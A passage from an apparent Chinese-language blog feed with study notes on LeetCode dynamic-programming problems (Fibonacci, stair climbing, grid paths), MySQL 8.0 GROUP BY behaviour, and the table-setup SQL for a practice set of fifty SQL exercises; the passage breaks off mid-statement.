class="hljs-keyword">if</span> n == <span class="hljs-number">1</span>:        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>    <span class="hljs-keyword">return</span> self.fib(n - <span class="hljs-number">1</span>) + self.fib(n - <span class="hljs-number">2</span>)</code></pre></div><p>不超时算我输，这里暴力递归显然没有利用上此前已计算出来的结果</p><p>方法二（<strong>带记忆的方法</strong>）：</p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span>:</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fib</span><span class="hljs-params">(self, n: int)</span> -&gt; int:</span>        f = [<span class="hljs-number">0</span>] * (n+<span class="hljs-number">1</span>)<span class="hljs-comment">#初始化一个元素个数为n+1且元素全为0的列表</span>        <span class="hljs-keyword">if</span> n == <span class="hljs-number">0</span>:            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>        <span class="hljs-keyword">if</span> n == <span class="hljs-number">1</span>:            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>        <span class="hljs-keyword">else</span>:            f[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>            f[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">2</span>,len(f)):                f[i] = f[i<span class="hljs-number">-1</span>] + f[i<span class="hljs-number">-2</span>]<span class="hljs-comment">#转移方程</span>            <span class="hljs-keyword">return</span> f[<span class="hljs-number">-1</span>]<span class="hljs-comment">#返回列表最后一个数</span></code></pre></div><p>上述代码中，$f[i]$表示的是数列中第$i$个元素的数值（确定状态），$f(i) = f(i-1) + f(i-2)$（转移方程），$f(0) = f(1) = 1$（初始状态），迭代到第$n$个元素就停止（边界条件）</p><p><a href="https://leetcode-cn.com/problems/climbing-stairs/solution/zhi-xin-hua-shi-pa-lou-ti-zhi-cong-bao-l-lo1t/" target="_blank" rel="noopener">参考：【知信】花式爬楼梯，从暴力爬楼梯，到动态规划爬楼梯</a></p><p>斐波那契问题简单，如果换成具体问题呢？</p><ul><li><a href="https://leetcode-cn.com/problems/climbing-stairs/" target="_blank" rel="noopener">70. 爬楼梯</a></li></ul><p>一样先<strong>确定状态</strong>，然后写出<strong>转移方程</strong>，最后是<strong>初始条件和边界情况</strong></p><p>这里$f[i]$的值表示爬楼梯的方法数（确定状态）</p><p>因为每次可以爬1或2步，所以到第$i$格楼梯的爬法（个数）都是由到$i-1$和到$i-2$阶楼梯的爬法相加，因而转移方程为$f(i) = f(i-1) + f(i-2)$</p><p>初始条件$f(0) = f(1) = 1$（爬第一格楼梯和第二个楼梯只有一种方法），从2开始迭代到n+1（第一个元素用来存储第0格楼梯的爬法了，所以是n+1）从而可以确定边界条件</p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span>:</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">climbStairs</span><span class="hljs-params">(self, n: int)</span> -&gt; int:</span>        f = [<span class="hljs-number">0</span>]*(n+<span class="hljs-number">1</span>)  <span class="hljs-comment">#生成n+1个元素的列表</span>        f[<span class="hljs-number">0</span>] = f[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>   <span class="hljs-comment"># 0格楼梯和1格楼梯只需要1步</span>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">2</span>,n+<span class="hljs-number">1</span>):            f[i] = f[i<span class="hljs-number">-1</span>] + f[i<span class="hljs-number">-2</span>]<span class="hljs-comment">#转移方程</span>        <span class="hljs-keyword">return</span> f[<span class="hljs-number">-1</span>]<span class="hljs-comment">#列表的倒数第一个元素（最后一个元素）</span></code></pre></div><p>这种是每次可以爬一步或两步的，同理，如果可以爬三步的，那转移方程则为$f(i) = f(i-1) + f(i-2) + f(i-3)$</p><p>具体题目看</p><ul><li><a href="https://leetcode-cn.com/problems/three-steps-problem-lcci/" target="_blank" rel="noopener">面试题 08.01. 三步问题</a></li></ul><p>还是像之前那样先<strong>确定状态</strong>，然后写出<strong>转移方程</strong>，最后是<strong>初始条件和边界情况</strong></p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span>:</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">waysToStep</span><span class="hljs-params">(self, n: int)</span> -&gt; int:</span>        <span class="hljs-keyword">if</span> n == <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> n == <span class="hljs-number">1</span>:            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>        <span class="hljs-keyword">if</span> n == <span class="hljs-number">2</span>:            <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>        <span class="hljs-keyword">if</span> n == <span class="hljs-number">3</span>:            <span class="hljs-keyword">return</span> <span class="hljs-number">4</span>        <span class="hljs-keyword">else</span>:            dp = [<span class="hljs-number">0</span>] * (n+<span class="hljs-number">1</span>)            dp[<span class="hljs-number">0</span>] = dp[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>            dp[<span class="hljs-number">2</span>] = <span class="hljs-number">2</span>            dp[<span class="hljs-number">3</span>] = <span class="hljs-number">4</span>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">3</span>,n+<span class="hljs-number">1</span>):                dp[i] = dp[i<span class="hljs-number">-1</span>] + dp[i<span class="hljs-number">-2</span>] + dp[i<span class="hljs-number">-3</span>]        <span class="hljs-keyword">return</span> dp[<span class="hljs-number">-1</span>]%<span class="hljs-number">1000000007</span></code></pre></div><p>上述代码中if部分为特例，else部分显然包括了状态（$f(i)$表示有多少种爬法）；转移方程则变成了$f(i) = f(i-1) + f(i-2) + f(i-3)$，迭代次数为到$n+1$停止（边界条件）</p><ul><li><a href="https://leetcode-cn.com/problems/min-cost-climbing-stairs/" target="_blank" rel="noopener">746. 使用最小花费爬楼梯</a></li></ul><p>之前的题都是有几种爬楼梯的方法，这次题目换了一下，增加的条件是每爬一次都有体力消耗，求爬完楼梯最小体力消耗是多少（体力的最低花费）？</p><p>套路：</p><p><strong>确定状态</strong>：这次$f(i)$表示的不是有几种爬法了，因为题目求体力的最低花费，所以此时$f(i)$表示的是爬到第$i$格楼梯体力的最低花费；</p><p><strong>转移方程</strong>：$f(i) = min[ f(i-1)+cost(i),f(i-2)+cost(i-1) ]$，$f(i)$表示爬到第$i$格楼梯体力的最低花费，因为每次可以爬楼梯1或2阶，所以爬到第$i$阶有两种可能：</p><ol><li>爬到第$i-1$阶再爬1步到第$i$阶（耗费体力为$f(i-1)+cost[i]$）</li><li>爬到$i-2$阶再爬2步第$i$阶（耗费体力为$f(i-2)+cost[i-1]$）</li></ol><p>所以，显然两种方式里哪个小，则哪种就是到第$i$阶的体力最低花费，因而得到转移方程</p><p><strong>初始条件和边界情况</strong>：（懒得写了）</p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span>:</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">minCostClimbingStairs</span><span class="hljs-params">(self, cost: List[int])</span> -&gt; int:</span>                n = len(cost)        <span class="hljs-keyword">if</span> n == <span class="hljs-number">2</span>:            <span class="hljs-keyword">return</span> min(cost)        <span class="hljs-keyword">else</span>:            x = [<span class="hljs-number">0</span>] * n            x[<span class="hljs-number">1</span>] = min(cost[<span class="hljs-number">0</span>],cost[<span class="hljs-number">1</span>])            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">2</span>,len(x)):                x[i] = min(x[i<span class="hljs-number">-1</span>]+cost[i],x[i<span class="hljs-number">-2</span>]+cost[i<span class="hljs-number">-1</span>])            <span class="hljs-keyword">return</span> x[<span class="hljs-number">-1</span>]</code></pre></div><p>leetcode斐波那契问题合集：</p><p><a href="https://leetcode-cn.com/problems/fibonacci-number/" target="_blank" rel="noopener">509. 斐波那契数</a></p><p><a href="https://leetcode-cn.com/problems/climbing-stairs/" target="_blank" rel="noopener">70. 爬楼梯</a></p><p><a href="https://leetcode-cn.com/problems/fei-bo-na-qi-shu-lie-lcof/" target="_blank" rel="noopener">剑指 Offer 10- I. 斐波那契数列</a></p><p><a href="https://leetcode-cn.com/problems/qing-wa-tiao-tai-jie-wen-ti-lcof/" target="_blank" rel="noopener">剑指 Offer 10- II. 青蛙跳台阶问题e</a></p><p><a href="https://leetcode-cn.com/problems/three-steps-problem-lcci/" target="_blank" rel="noopener">面试题 08.01. 三步问题</a></p><p><a href="https://leetcode-cn.com/problems/min-cost-climbing-stairs/" target="_blank" rel="noopener">746. 使用最小花费爬楼梯</a></p><p><a href="https://leetcode-cn.com/problems/n-th-tribonacci-number/" target="_blank" rel="noopener">1137. 第 N 个泰波那契数</a></p><h3 id="从左上角到右下角"><a href="#从左上角到右下角" class="headerlink" title="从左上角到右下角"></a>从左上角到右下角</h3><ul><li><a href="https://leetcode-cn.com/problems/unique-paths/" target="_blank" rel="noopener">62. 不同路径</a></li></ul><p>机器人位于 m x n 网格的左上角，每次<strong>只能向下</strong>或者<strong>向右</strong>移动一步。机器人试图达到网格的右下角</p><p>问总共有多少条不同的路径？</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/robot_maze.png" srcset="/img/loading.gif" lazyload="" alt="img"></p><p>还是动态规划，只是一维变二维（即使$f(i)$变$f(i,j)$，莫慌）</p><p>还是像之前那样先<strong>确定状态</strong>，然后写出<strong>转移方程</strong>，最后是<strong>初始条件和边界情况</strong></p><p><strong>确定状态</strong>:$f(i,j)$表示到第$i$行第$j$列的位置有多少种走法</p><p><strong>转移方程</strong>:因为只能向下或向右，所以$f(i,j) = f(i-1,j)+f(i,j-1)$</p><p><strong>初始条件和边界情况</strong>：初始条件为$f(0,0)=1$，注意$0\le i\le m-1$，$0\le j \le n-1$（从零开始数嘛）</p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span>:</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">uniquePaths</span><span class="hljs-params">(self, m: int, n: int)</span> -&gt; int:</span>        f = [ [<span class="hljs-number">0</span>] * n ] * m <span class="hljs-comment">#生成m*n大小的矩阵</span>        f[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,m):            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,n):                <span class="hljs-keyword">if</span> i &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> j &gt; <span class="hljs-number">0</span>:                    f[i][j] = f[i<span class="hljs-number">-1</span>][j] + f[i][j<span class="hljs-number">-1</span>]                <span class="hljs-keyword">elif</span> i &gt; <span class="hljs-number">0</span> :                    f[i][j] = f[i<span class="hljs-number">-1</span>][j]                <span class="hljs-keyword">elif</span> j &gt; <span class="hljs-number">0</span> :                    f[i][j] = f[i][j<span class="hljs-number">-1</span>]                <span class="hljs-keyword">else</span>:                    <span class="hljs-keyword">continue</span>        <span class="hljs-keyword">return</span> f[m<span class="hljs-number">-1</span>][n<span class="hljs-number">-1</span>]</code></pre></div><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL底层原理及实操记录</title>
      <link href="/2021/03/31/SQL%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E6%93%8D%E8%AE%B0%E5%BD%95/"/>
      <url>/2021/03/31/SQL%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E6%93%8D%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>MySQL45讲学习笔记,从底层原理上里理解关系型数据库并记录实操（MySQL8.0的一些新特性）</p><a id="more"></a><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>MySQL45讲学习笔记,从底层原理上里理解关系型数据库并记录实操（MySQL8.0的一些新特性）</p><h2 id="MySQL底层原理"><a href="#MySQL底层原理" class="headerlink" title="MySQL底层原理"></a>MySQL底层原理</h2><h2 id="MySQL实操记录"><a href="#MySQL实操记录" class="headerlink" title="MySQL实操记录"></a>MySQL实操记录</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><ol><li>安装MySQL</li><li>安装Navicat（新手建议安装，非必须）</li></ol><p>靠谱参考教程：<a href="https://blog.csdn.net/qq_37350706/article/details/81707862" target="_blank" rel="noopener">https://blog.csdn.net/qq_37350706/article/details/81707862</a></p><h3 id="group-by"><a href="#group-by" class="headerlink" title="group by"></a>group by</h3><p>MySQL8.0中的group by有新特性，默认开启参数ONLY_FULL_GROUP_BY，可以通过输入以下命令查看：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> @@sql_mode;</code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/image-20210331105532759.png" srcset="/img/loading.gif" lazyload="" alt=""></p><p>默认开启参数ONLY_FULL_GROUP_BY，表示开启group by完全模式：即select后面跟的列group by后面也必须有，但是group by后面跟的列，select后面不一定需要出现。</p><p>故会出现以下情况：</p><p>1）报错：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> anchorinformation <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> AnchorID;</code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/image-20210331105924043.png" srcset="/img/loading.gif" lazyload="" alt=""></p><p>2） 成功执行</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> AnchorID <span class="hljs-keyword">from</span> anchorinformation <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> AnchorID;</code></pre></div><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> AnchorID,ANY_VALUE(anchor) <span class="hljs-keyword">from</span> anchorinformation <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> AnchorID;</code></pre></div><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 大数据技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL五十题</title>
      <link href="/2021/03/30/SQL%E4%BA%94%E5%8D%81%E9%A2%98/"/>
      <url>/2021/03/30/SQL%E4%BA%94%E5%8D%81%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>SQL五十题</p><a id="more"></a><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>题目来自<a href="https://cloud.tencent.com/developer/article/1540526" target="_blank" rel="noopener">SQL练习题共50道附答案（MySQL）</a></p><p>此处不是正题，而是建表</p><p>1.学生表  student(s_id,s_name,s_birth,s_sex) </p><p>– 学生编号,学生姓名, 出生年月,学生性别 </p><p>2.课程表  course(c_id,c_name,t_id) </p><p>– 课程编号, 课程名称, 教师编号 </p><p>3.教师表  teacher(t_id,t_name) </p><p>-– 教师编号,教师姓名 </p><p>4.成绩表  score(s_id,c_id,s_score) </p><p>–学生编号,课程编号,分数</p><p>建议安装个Navicat，然后打开命令行，主要是界面看起来清爽（手动滑稽）</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/image-20210331011629991.png" srcset="/img/loading.gif" lazyload="" alt=""></p><p>命令如下</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-comment">--  建立课程表</span><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-keyword">IF</span> <span class="hljs-keyword">EXISTS</span> <span class="hljs-string">`course`</span>;<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-string">`course`</span>  (  <span class="hljs-string">`c_id`</span> <span class="hljs-built_in">varchar</span>(<span class="hljs-number">20</span>) <span class="hljs-built_in">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8 <span class="hljs-keyword">COLLATE</span> utf8_general_ci <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">''</span> <span class="hljs-keyword">COMMENT</span> <span class="hljs-string">'课程编号'</span>,  <span class="hljs-string">`c_name`</span> <span class="hljs-built_in">varchar</span>(<span class="hljs-number">20</span>) <span class="hljs-built_in">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8 <span class="hljs-keyword">COLLATE</span> utf8_general_ci <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">''</span> <span class="hljs-keyword">COMMENT</span> <span class="hljs-string">'课程名称'</span>,  <span class="hljs-string">`t_id`</span> <span class="hljs-built_in">varchar</span>(<span class="hljs-number">20</span>) <span class="hljs-built_in">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8 <span class="hljs-keyword">COLLATE</span> utf8_general_ci <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span> <span class="hljs-keyword">COMMENT</span> <span class="hljs-string">'教师编号'</span>,  PRIMARY <span class="hljs-keyword">KEY</span> (<span class="hljs-string">`c_id`</span>) <span class="hljs-keyword">USING</span> BTREE) <span class="hljs-keyword">ENGINE</span> = <span class="hljs-keyword">InnoDB</span> <span class="hljs-built_in">CHARACTER</span> <span class="hljs-keyword">SET</span> = utf8 <span class="hljs-keyword">COLLATE</span> = utf8_general_ci ROW_FORMAT = <span class="hljs-keyword">Compact</span>;<span class="hljs-comment">-- 课程表数据</span><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-string">`course`</span> <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'01'</span>, <span class="hljs-string">'语文'</span>, <span class="hljs-string">'02'</span>);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-string">`course`</span> <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'02'</span>, <span class="hljs-string">'数学'</span>, <span class="hljs-string">'01'</span>);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-string">`course`</span> <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'03'</span>, <span class="hljs-string">'英语'</span>, <span class="hljs-string">'03'</span>);<span class="hljs-comment">-- 分数表</span><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-keyword">IF</span> <span class="hljs-keyword">EXISTS</span> <span class="hljs-string">`score`</span>;<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-string">`score`</span>  (  <span class="hljs-string">`s_id`</span> <span class="hljs-built_in">varchar</span>(<span class="hljs-number">20</span>) <span class="hljs-built_in">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8 <span class="hljs-keyword">COLLATE</span> utf8_general_ci <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">''</span> <span class="hljs-keyword">COMMENT</span> <span class="hljs-string">'学生编号'</span>,  <span class="hljs-string">`c_id`</span> <span class="hljs-built_in">varchar</span>(<span class="hljs-number">20</span>) <span class="hljs-built_in">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8 <span class="hljs-keyword">COLLATE</span> utf8_general_ci <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">''</span> <span class="hljs-keyword">COMMENT</span> <span class="hljs-string">'课程编号'</span>,  <span class="hljs-string">`s_score`</span> <span class="hljs-built_in">int</span>(<span class="hljs-number">3</span>) <span class="hljs-literal">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-literal">NULL</span> <span class="hljs-keyword">COMMENT</span> <span class="hljs-string">'分数'</span>,  PRIMARY <span class="hljs-keyword">KEY</span> (<span class="hljs-string">`s_id`</span>, <span class="hljs-string">`c_id`</span>) <span class="hljs-keyword">USING</span> BTREE) <span class="hljs-keyword">ENGINE</span> = <span class="hljs-keyword">InnoDB</span> <span class="hljs-built_in">CHARACTER</span> <span class="hljs-keyword">SET</span> = utf8 <span class="hljs-keyword">COLLATE</span> = utf8_general_ci ROW_FORMAT = <span class="hljs-keyword">Compact</span>;<span class="hljs-comment">-- 分数数据</span><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-string">`score`</span> <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'01'</span>, <span class="hljs-string">'01'</span>, <span class="hljs-number">80</span>);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-string">`score`</span> <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'01'</span>, <span class="hljs-string">'02'</span>, <span class="hljs-number">90</span>);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-string">`score`</span> <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'01'</span>, <span class="hljs-string">'03'</span>, <span class="hljs-number">99</span>);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-string">`score`</span> <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'02'</span>, <span class="hljs-string">'01'</span>, <span class="hljs-number">70</span>);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-string">`score`</span> <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'02'</span>, <span class="hljs-string">'02'</span>, <span class="hljs-number">60</span>);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-string">`score`</span> <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'02'</span>, <span class="hljs-string">'03'</span>, <span class="hljs-number">80</span>);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-string">`score`</span> <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'03'</span>, <span class="hljs-string">'01'</span>, <span class="hljs-number">80</span>);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-string">`score`</span> <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'03'</span>, <span class="hljs-string">'02'</span>, <span class="hljs-number">80</span>);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-string">`score`</span> <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'03'</span>, <span class="hljs-string">'03'</span>, <span class="hljs-number">80</span>);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-string">`score`</span> <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'04'</span>, <span class="hljs-string">'01'</span>, <span class="hljs-number">50</span>);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-string">`score`</span> <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'04'</span>, <span class="hljs-string">'02'</span>, <span class="hljs-number">30</span>);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-string">`score`</span> <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'04'</span>, <span class="hljs-string">'03'</span>, <span class="hljs-number">20</span>);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-string">`score`</span> <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'05'</span>, <span class="hljs-string">'01'</span>, <span class="hljs-number">76</span>);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-string">`score`</span> <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'05'</span>, <span class="hljs-string">'02'</span>, <span class="hljs-number">87</span>);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-string">`score`</span> <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'05'</span>, <span class="hljs-string">'03'</span>, <span class="hljs-number">95</span>);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-string">`score`</span> <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'06'</span>, <span class="hljs-string">'01'</span>, <span class="hljs-number">31</span>);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-string">`score`</span> <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'06'</span>, <span class="hljs-string">'02'</span>, <span class="hljs-number">88</span>);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-string">`score`</span> <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'06'</span>, <span class="hljs-string">'03'</span>, <span class="hljs-number">34</span>);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-string">`score`</span> <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'07'</span>, <span class="hljs-string">'01'</span>, <span class="hljs-number">66</span>);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-string">`score`</span> <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'07'</span>, <span class="hljs-string">'02'</span>, <span class="hljs-number">89</span>);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-string">`score`</span> <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'07'</span>, <span class="hljs-string">'03'</span>, <span class="hljs-number">98</span>);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-string">`score`</span> <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'08'</span>, <span class="hljs-string">'01'</span>, <span class="hljs-number">59</span>);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-string">`score`</span> <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'08'</span>, <span class="hljs-string">'02'</span>, <span class="hljs-number">88</span>);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-string">`score`</span> <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'09'</span>, <span class="hljs-string">'02'</span>, <span class="hljs-number">67</span>);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-string">`score`</span> <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'09'</span>, <span class="hljs-string">'03'</span>, <span class="hljs-number">88</span>);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-string">`score`</span> <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'10'</span>, <span class="hljs-string">'01'</span>, <span class="hljs-number">65</span>);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-string">`score`</span> <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'10'</span>, <span class="hljs-string">'02'</span>, <span class="hljs-number">78</span>);<span class="hljs-comment">-- 建立学生表</span><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-keyword">IF</span> <span class="hljs-keyword">EXISTS</span> <span class="hljs-string">`student`</span>;<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-string">`student`</span>  (  <span class="hljs-string">`s_id`</span> <span class="hljs-built_in">varchar</span>(<span class="hljs-number">20</span>) <span class="hljs-built_in">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8 <span class="hljs-keyword">COLLATE</span> utf8_general_ci <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">''</span> <span class="hljs-keyword">COMMENT</span> <span class="hljs-string">'学生编号'</span>,  <span class="hljs-string">`s_name`</span> <span class="hljs-built_in">varchar</span>(<span class="hljs-number">20</span>) <span class="hljs-built_in">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8 <span class="hljs-keyword">COLLATE</span> utf8_general_ci <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">''</span> <span class="hljs-keyword">COMMENT</span> <span class="hljs-string">'学生姓名'</span>,  <span class="hljs-string">`s_birth`</span> <span class="hljs-built_in">varchar</span>(<span class="hljs-number">20</span>) <span class="hljs-built_in">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8 <span class="hljs-keyword">COLLATE</span> utf8_general_ci <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">''</span> <span 